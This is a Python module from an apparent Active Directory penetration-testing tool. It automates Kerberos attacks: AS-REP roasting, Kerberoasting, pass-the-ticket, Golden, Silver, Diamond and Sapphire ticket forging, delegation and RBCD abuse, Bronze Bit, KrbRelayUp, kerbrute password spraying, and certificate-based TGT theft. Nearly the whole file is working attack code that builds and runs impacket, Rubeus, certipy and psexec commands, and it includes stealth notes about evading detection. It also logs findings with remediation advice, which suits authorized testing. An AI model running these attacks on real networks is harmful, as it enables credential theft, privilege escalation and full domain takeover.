"""
Module: Kerberos Attacks
Techniques: AS-REP Roast, Kerberoast, PtT, Overpass-the-Hash,
            Golden/Silver/Diamond/Sapphire Ticket, Delegation abuse,
            RBCD, Bronze Bit, KrbRelayUp, kerbrute, AS-REQ spray,
            PKINIT/cert-based TGT, NTLM-disabled workflow
"""
from utils.helpers import *
from config.settings import SESSION

# imp() is imported from utils.helpers (via *) — uses system python3, bypasses venv


MENU = """
  ── ROASTING ────────────────────────────────────────────────
  [1]  AS-REP Roasting                (no pre-auth accounts)
  [2]  Kerberoasting                  (SPN accounts)
  ── TICKET ATTACKS ──────────────────────────────────────────
  [3]  Pass-the-Ticket                (inject .ccache)
  [4]  Overpass-the-Hash              (NTLM → TGT)
  [5]  Golden Ticket Forge            (krbtgt hash)
  [6]  Silver Ticket Forge            (service hash)
  ── ENUMERATION / SPRAY (NO NTLM NEEDED) ────────────────────
  [13] kerbrute — User Enumeration    (Kerberos port 88)
  [14] AS-REQ Password Spray          (kerbrute, no lockout alert)
  [0]  Back
"""


def run():
    print_banner("KERBEROS ATTACKS")
    dc   = input_or_session("dc_ip",    "DC IP")
    dom  = input_or_session("domain",   "Domain")
    user = input_or_session("username", "Username")
    pw   = input_or_session("password", "Password")

    print(MENU)
    c = input(f"  {M}Choice:{RST} ").strip().upper()

    # ── [1] AS-REP Roasting ───────────────────────────────────────────────────
    if c == "1":
        users = prompt("Users file (default /tmp/users.txt)") or "/tmp/users.txt"
        run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass "
                f"-usersfile {users} -format hashcat -outputfile /tmp/asrep.txt")
        info("Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")
        add_finding("AS-REP Roasting", "High",
                    "Users found without Kerberos pre-auth",
                    "Enable Kerberos pre-authentication for all accounts")

    # ── [2] Kerberoasting ─────────────────────────────────────────────────────
    elif c == "2":
        run_cmd(f"{imp('GetUserSPNs.py')} {dom}/{user}:'{pw}' "
                f"-dc-ip {dc} -request -outputfile /tmp/kerberoast.txt")
        info("Crack: hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt")
        add_finding("Kerberoasting", "High",
                    "Service accounts with weak SPNs found",
                    "Use strong passwords (25+chars) for service accounts; use gMSA")

    # ── [3] Pass-the-Ticket ───────────────────────────────────────────────────
    elif c == "3":
        import os as _os
        ccache = prompt(".ccache file path")
        _os.environ["KRB5CCNAME"] = ccache
        SESSION["krb5_ccache"]  = ccache
        SESSION["use_kerberos"] = True
        info(f"KRB5CCNAME set → {ccache}")
        run_cmd(f"{imp('psexec.py')} {dom}/{user}@{dc} -k -no-pass")

    # ── [4] Overpass-the-Hash ─────────────────────────────────────────────────
    elif c == "4":
        import os as _os
        nth = prompt("NTLM hash")
        run_cmd(f"{imp('getTGT.py')} {dom}/{user} -hashes :{nth} -dc-ip {dc}")
        ccache_path = f"/tmp/{user}.ccache"
        _os.environ["KRB5CCNAME"] = ccache_path
        SESSION["krb5_ccache"]  = ccache_path
        SESSION["use_kerberos"] = True
        info(f"KRB5CCNAME set → {ccache_path}")
        run_cmd(f"{imp('psexec.py')} {dom}/{user}@{dc} -k -no-pass")

    # ── [5] Golden Ticket ─────────────────────────────────────────────────────
    elif c == "5":
        krbtgt = prompt("krbtgt NTLM hash")
        sid    = prompt("Domain SID (S-1-5-21-...)")
        uid    = prompt("RID (default 500)") or "500"
        run_cmd(f"{imp('ticketer.py')} -nthash {krbtgt} -domain-sid {sid} "
                f"-domain {dom} -user-id {uid} Administrator")
        info("export KRB5CCNAME=Administrator.ccache")
        add_finding("Golden Ticket", "Critical",
                    "krbtgt hash compromised — Golden Ticket forged",
                    "Reset krbtgt password twice; monitor for anomalous TGT lifetimes")

    # ── [6] Silver Ticket ─────────────────────────────────────────────────────
    elif c == "6":
        svc_h = prompt("Service account NTLM hash")
        sid   = prompt("Domain SID")
        spn   = prompt("SPN (e.g. cifs/server.corp.local)")
        run_cmd(f"{imp('ticketer.py')} -nthash {svc_h} -domain-sid {sid} "
                f"-domain {dom} -spn {spn} silverticket")

    # ── [7] Unconstrained Delegation ─────────────────────────────────────────
    elif c == "7":
        run_cmd(f"{imp('findDelegation.py')} {dom}/{user}:'{pw}' -dc-ip {dc}")
        info("Coerce auth to unconstrained host using PrinterBug / PetitPotam, capture TGT")

    # ── [8] Constrained Delegation (S4U2Proxy) ────────────────────────────────
    elif c == "8":
        target = prompt("Target service host (e.g. DC01)")
        run_cmd(f"{imp('getST.py')} -spn cifs/{target}.{dom} "
                f"-impersonate Administrator {dom}/{user}:'{pw}' -dc-ip {dc}")

    # ── [9] RBCD ──────────────────────────────────────────────────────────────
    elif c == "9":
        comp  = prompt("Attacker computer account name")
        chash = prompt("Computer account NTLM hash")
        victim= prompt("Victim computer")
        run_cmd(f"{imp('rbcd.py')} -f {comp} -t {victim} "
                f"-k -no-pass {dom}/{user}:'{pw}'")
        run_cmd(f"{imp('getST.py')} -spn cifs/{victim}.{dom} "
                f"-impersonate Administrator -dc-ip {dc} "
                f"{dom}/{comp}$ -hashes :{chash}")
        add_finding("RBCD Attack", "Critical",
                    f"Resource-Based Constrained Delegation abused on {victim}",
                    "Restrict MachineAccountQuota to 0; monitor msDS-AllowedToActOnBehalfOfOtherIdentity")

    # ── [10] Diamond Ticket ───────────────────────────────────────────────────
    elif c == "10":
        target_user = prompt("User to impersonate (e.g. Administrator)")
        uid         = prompt("Target user RID (default 500)") or "500"
        print(f"""
  {NEON_CYN}Diamond Ticket — Stealthy TGT Modification:{RST}

  {DIM}Unlike Golden Ticket (forged from scratch), Diamond Ticket requests a
  legit TGT first, then modifies the PAC in-memory using the krbtgt key.
  → Valid timestamps & fields → evades most Golden Ticket detections.{RST}

  ── Rubeus (via TGT delegation, no krbtgt hash needed) ───────────────────
  Rubeus.exe diamond /tgtdeleg /enctype:aes /ticketuser:{target_user} \\
    /domain:{dom} /dc:{dc} /ticketuserid:{uid} /groups:512

  ── Rubeus (with krbtgt AES256) ──────────────────────────────────────────
  Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:{user} /password:'{pw}' \\
    /enctype:aes /ticketuser:{target_user} /domain:{dom} /dc:{dc} \\
    /ticketuserid:{uid} /groups:512 /ptt

  ── Verify ───────────────────────────────────────────────────────────────
  Rubeus.exe triage
  ls \\\\{dc}\\c$
""")
        add_finding("Diamond Ticket", "Critical",
                    f"Diamond ticket forged for {target_user}",
                    "Monitor PAC group memberships; enforce KB5008380")

    # ── [11] Sapphire Ticket ──────────────────────────────────────────────────
    elif c == "11":
        target_user = prompt("Target user to impersonate")
        print(f"""
  {NEON_CYN}Sapphire Ticket — Copy Legitimate PAC (Maximum Stealth):{RST}

  {DIM}Copies PAC directly from a legit TGS → perfect copy → no anomalous fields.
  Requires krbtgt AES256 key.{RST}

  ── Rubeus (/ldap pulls real PAC values) ─────────────────────────────────
  Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:{user} /password:'{pw}' \\
    /enctype:aes /ticketuser:{target_user} /domain:{dom} /dc:{dc} \\
    /ticketuserid:<target_rid> /groups:512 /ldap /ptt

  ── Impacket ─────────────────────────────────────────────────────────────
  {imp('ticketer.py')} -request -domain {dom} -user {user} -password '{pw}' \\
    -nthash <krbtgt_nt> -domain-sid <domSID> -user-id <target_rid> \\
    -groups 512,520,519 {target_user}
""")
        add_finding("Sapphire Ticket", "Critical",
                    f"Sapphire ticket forged for {target_user} — PAC copied from legit TGS",
                    "Implement Protected Users group; enforce Credential Guard; monitor Kerberos S4U2Self for DA accounts")

    # ── [12] Bronze Bit (CVE-2020-17049) ─────────────────────────────────────
    elif c == "12":
        svc_user = prompt("Service account (constrained delegation, NOT TrustedToAuth)")
        svc_pw   = prompt("Service account password")
        svc_hash = prompt("Service account NT hash (blank = use password)")
        target   = prompt("Target SPN (e.g. cifs/dc01.corp.local)")
        imperson = prompt("User to impersonate (e.g. Administrator)")
        alt_svc  = prompt("Alt service for -altservice (e.g. host, ldap — blank to skip)") or ""
        auth_arg = f"-hashes :{svc_hash}" if svc_hash else f"'{svc_pw}'"
        alt_arg  = f"-altservice {alt_svc}" if alt_svc else ""
        print(f"""
  {NEON_CYN}Bronze Bit — CVE-2020-17049:{RST}

  {DIM}Forges the 'forwardable' flag in a service ticket even when the target
  principal has "Account is sensitive and cannot be delegated" set, or when
  the requesting service is NOT marked TrustedToAuthForDelegation.
  Requires service account hash + constrained delegation configured.{RST}

  ── Impacket getST with -force-forwardable ────────────────────────────────
  {imp('getST.py')} -spn {target} -impersonate {imperson} \\
    -force-forwardable {alt_arg} \\
    {dom}/{svc_user}:{auth_arg} -dc-ip {dc}

  ── Rubeus (s4u /bronzebit) ──────────────────────────────────────────────
  Rubeus.exe s4u /user:{svc_user} /rc4:{svc_hash or "<hash>"} \\
    /impersonateuser:{imperson} /msdsspn:{target} \\
    /bronzebit /domain:{dom} /dc:{dc} /ptt
""")
        run_cmd(f"{imp('getST.py')} -spn {target} -impersonate {imperson} "
                f"-force-forwardable {alt_arg} "
                f"{dom}/{svc_user}:{auth_arg} -dc-ip {dc}")
        add_finding("Bronze Bit (CVE-2020-17049)", "Critical",
                    f"Forwardable flag forged for service ticket — impersonated {imperson}",
                    "Apply KB4598347; disable unconstrained delegation; monitor S4U traffic")

    # ── [13] kerbrute — User Enumeration ─────────────────────────────────────
    elif c == "13":
        wordlist = prompt("Wordlist (default /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt)") \
                   or "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
        threads  = prompt("Threads (default 50)") or "50"
        outfile  = "/tmp/kerbrute_valid_users.txt"
        print(f"""
  {NEON_CYN}kerbrute — Kerberos User Enumeration (no NTLM, no auth required):{RST}
  {DIM}Works by sending AS-REQ requests — valid users get KDC_ERR_PREAUTH_REQUIRED,
  invalid users get KDC_ERR_C_PRINCIPAL_UNKNOWN.
  No failed-logon events in event logs (only 4768 for valid users).{RST}
""")
        run_cmd(f"kerbrute userenum --dc {dc} --domain {dom} "
                f"-t {threads} --output {outfile} {wordlist}")
        info(f"Valid users saved → {outfile}")
        info("Use valid users list for AS-REP Roasting (option [1])")

    # ── [14] AS-REQ Password Spray ────────────────────────────────────────────
    elif c == "14":
        password  = prompt("Password to spray") or pw
        userlist  = prompt("User list (default /tmp/kerbrute_valid_users.txt)") \
                    or "/tmp/kerbrute_valid_users.txt"
        delay     = prompt("Delay ms between attempts (default 0)") or "0"
        print(f"""
  {NEON_CYN}AS-REQ Password Spray — via Kerberos (no NTLM needed):{RST}
  {DIM}Sends AS-REQ with the guessed password. If NTLM is disabled,
  this is the primary spray method. Lower lockout visibility than LDAP bind spray.
  Use with delay to avoid account lockouts.{RST}
""")
        run_cmd(f"kerbrute passwordspray --dc {dc} --domain {dom} "
                f"-d {delay} {userlist} '{password}'")
        info("Crack any captured hashes: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")

    # ── [15] KrbRelayUp ───────────────────────────────────────────────────────
    elif c == "15":
        print(f"""
  {NEON_CYN}KrbRelayUp — Kerberos Relay → Local SYSTEM (no NTLM needed):{RST}

  {DIM}Relays Kerberos authentication from a local service to LDAP/LDAPS to
  add RBCD rights for a machine account we control, then uses S4U to get a
  SYSTEM-level service ticket. Requires low-priv shell on target.{RST}

  ── Prerequisites ────────────────────────────────────────────────────────
  - Low-privileged shell on Windows target
  - Machine account quota > 0 OR existing computer account write access
  - LDAP signing not enforced (or use LDAPS channel binding bypass)

  ── KrbRelayUp (full auto) ───────────────────────────────────────────────
  KrbRelayUp.exe relay -Domain {dom} -CreateNewComputerAccount \\
    -ComputerName EVIL$ -ComputerPassword Password123!

  KrbRelayUp.exe spawn -m rbcd -d {dom} -dc {dc} \\
    -cn EVIL$ -cp Password123!

  ── Manual via impacket (Linux) ──────────────────────────────────────────
  # Step 1 — Add fake computer
  {imp('addcomputer.py')} -computer-name 'EVIL$' \\
    -computer-pass 'Password123!' -dc-ip {dc} {dom}/{user}:'{pw}'

  # Step 2 — Set RBCD on target
  {imp('rbcd.py')} -f EVIL -t <TARGET_COMPUTER> \\
    -dc-ip {dc} {dom}/{user}:'{pw}'

  # Step 3 — S4U to SYSTEM
  {imp('getST.py')} -spn cifs/<TARGET>.{dom} \\
    -impersonate Administrator -dc-ip {dc} \\
    {dom}/EVIL$:'Password123!'
  export KRB5CCNAME=Administrator@cifs_<TARGET>.{dom}.ccache
  {imp('psexec.py')} -k -no-pass {dom}/Administrator@<TARGET>.{dom}
""")
        add_finding("Kerberos Relay (KrbRelayUp)", "Critical",
                    "Local SYSTEM via Kerberos relay → RBCD abuse",
                    "Enable LDAP signing + channel binding; set MachineAccountQuota=0")

    # ── [16] PKINIT — Certificate-based TGT ──────────────────────────────────
    elif c == "16":
        cert_file = prompt("Certificate file (.pfx or .pem)")
        key_file  = prompt("Key file (.key) — blank if .pfx contains key") or ""
        cert_pass = prompt("PFX password (blank = none)") or ""
        out_cache = f"/tmp/{user}_cert.ccache"
        pass_arg  = f"-pfx-pass '{cert_pass}'" if cert_pass else ""
        key_arg   = f"-key-file {key_file}" if key_file else ""
        print(f"""
  {NEON_CYN}PKINIT — Certificate-based TGT (no password / no NTLM needed):{RST}

  {DIM}Uses PKINIT pre-authentication with a certificate to obtain a TGT.
  Works when: Shadow Credentials added, ADCS ESC1/ESC3 cert obtained,
  or machine certificate stolen.{RST}

  ── certipy (recommended) ────────────────────────────────────────────────
  certipy auth -pfx {cert_file} -dc-ip {dc} -username {user} -domain {dom}
  export KRB5CCNAME={user}.ccache

  ── impacket-gettgtpkinit (via PKINITtools) ───────────────────────────────
  python3 /opt/PKINITtools/gettgtpkinit.py {pass_arg} {key_arg} \\
    {dom}/{user} {out_cache} -cert-pem {cert_file} -dc-ip {dc}
  export KRB5CCNAME={out_cache}

  ── After TGT — get NT hash via U2U ──────────────────────────────────────
  certipy auth -pfx {cert_file} -dc-ip {dc} -username {user} -domain {dom}
  # certipy prints NT hash → use for Pass-the-Hash even without password
""")
        run_cmd(f"certipy auth -pfx {cert_file} -dc-ip {dc} "
                f"-username {user} -domain {dom}")
        add_finding("PKINIT Certificate Auth", "High",
                    "Certificate used to obtain TGT — credential material obtained",
                    "Monitor for anomalous PKINIT events (4768 with cert auth); audit issued certificates")

    # ── [A] NTLM-Disabled Attack Workflow (Kerberos-only DC) ────────────────
    elif c == "A":
        import os as _os, shutil as _sh
        realm   = dom.upper()
        dc_fqdn = SESSION.get("dc_fqdn") or prompt(f"DC FQDN (e.g. dc1.{dom})") or f"dc1.{dom}"

        print(f"""
  {NEON_CYN}{BOLD}NTLM-Disabled Attack Workflow{RST}
  {DIM}Kerberos-only environment — DC rejects NTLM (Protected Users, network policy).
  Follow these steps exactly in order.{RST}
""")
        # ── Step 1: Time sync ──────────────────────────────────────────────────
        section("Step 1 — Time sync (Kerberos requires < 5 min clock skew)")
        run_cmd(f"sudo ntpdate -u {dc_fqdn}")

        # ── Step 2: /etc/hosts ────────────────────────────────────────────────
        section("Step 2 — Add DC to /etc/hosts (Kerberos needs FQDN resolution)")
        run_cmd(f"grep -q '{dc_fqdn}' /etc/hosts || "
                f"echo '{dc} {dc_fqdn} {dom}' | sudo tee -a /etc/hosts")

        # ── Step 3: krb5.conf ─────────────────────────────────────────────────
        section("Step 3 — Generate krb5.conf")
        conf_path = f"/tmp/krb5_{dom}.conf"
        conf = f"""[libdefaults]
    default_realm = {realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    noaddresses = true

[realms]
    {realm} = {{
        kdc = {dc_fqdn}
        admin_server = {dc_fqdn}
        default_domain = {dom}
    }}

[domain_realm]
    .{dom} = {realm}
    {dom} = {realm}
"""
        with open(conf_path, "w") as f_:
            f_.write(conf)
        _os.environ["KRB5_CONFIG"] = conf_path
        SESSION["krb5_config"] = conf_path
        success(f"krb5.conf → {conf_path}")

        # ── Step 4: TGT ───────────────────────────────────────────────────────
        section("Step 4 — Request TGT")
        ccache = f"{user}.ccache"
        run_cmd(f"{imp('getTGT.py')} {dom}/{user}:'{pw}' -dc-ip {dc}")
        if _os.path.exists(ccache):
            _os.environ["KRB5CCNAME"] = ccache
            SESSION["krb5_ccache"]    = ccache
            SESSION["use_kerberos"]   = True
            success(f"TGT obtained → {ccache}")
            success("Kerberos mode ENABLED")
        else:
            warn("getTGT.py failed — check time sync and /etc/hosts")

        # ── Step 5: ADCS scan ─────────────────────────────────────────────────
        section("Step 5 — Scan ADCS for ESC vulnerabilities (certipy -k)")
        run_cmd(f"certipy find -u {user}@{dom} -k -no-pass "
                f"-dc-ip {dc} -target {dc_fqdn} -dc-host {dc_fqdn} "
                f"-vulnerable -stdout")

        # ── Step 6: Certificate request (ESC13 / ESC1) ───────────────────────
        section("Step 6 — Request certificate (ESC13 / ESC1 — use template from scan above)")
        template = prompt("Template name (from certipy find output, blank to skip)") or ""
        ca       = prompt("CA name (from certipy find output, blank to skip)") or ""
        if template and ca:
            run_cmd(f"certipy req -u {user}@{dom} -k -no-pass "
                    f"-dc-ip {dc} -target {dc_fqdn} -dc-host {dc_fqdn} "
                    f"-template '{template}' -ca '{ca}'")
            # Authenticate with cert → get new TGT (answer y to overwrite)
            section("Step 7 — Authenticate with certificate → get new TGT + NT hash")
            import subprocess as _sp
            auth_r = _sp.run(
                f"echo y | certipy auth -pfx {user}.pfx "
                f"-domain {dom} -dc-ip {dc}",
                shell=True, capture_output=True, text=True, timeout=30)
            print(auth_r.stdout[:1000])
            # Re-export new ccache
            new_cc = f"{user}.ccache"
            if _os.path.exists(new_cc):
                _os.environ["KRB5CCNAME"] = new_cc
                SESSION["krb5_ccache"]    = new_cc
                success(f"New ccache exported → {new_cc}")

        # ── Step 8: evil-winrm ────────────────────────────────────────────────
        ccache_now = SESSION.get("krb5_ccache", f"{user}.ccache")
        print(f"""
  {NEON_CYN}Step 8 — Connect with evil-winrm{RST}
  {DIM}NOTE: -i must be FQDN (not IP), -r must be UPPERCASE, -K (uppercase) = ccache path{RST}

  {BOLD}evil-winrm -i {dc_fqdn} -r {realm} -K {ccache_now}{RST}

  ── Other tools with active TGT ──────────────────────────────────────────
  export KRB5CCNAME={ccache_now}
  nxc smb {dc} -u {user} -k --kdcHost {dc} --shares
  nxc smb {dc} -u {user} -k --kdcHost {dc} --users
  bloodhound-python -u {user} -k --no-pass -d {dom} -dc {dc_fqdn} -c All
  {imp('GetUserSPNs.py')} {dom}/{user} -k -no-pass -dc-ip {dc} -request
  {imp('psexec.py')} -k -no-pass {dom}/Administrator@{dc_fqdn}
""")

    pause()
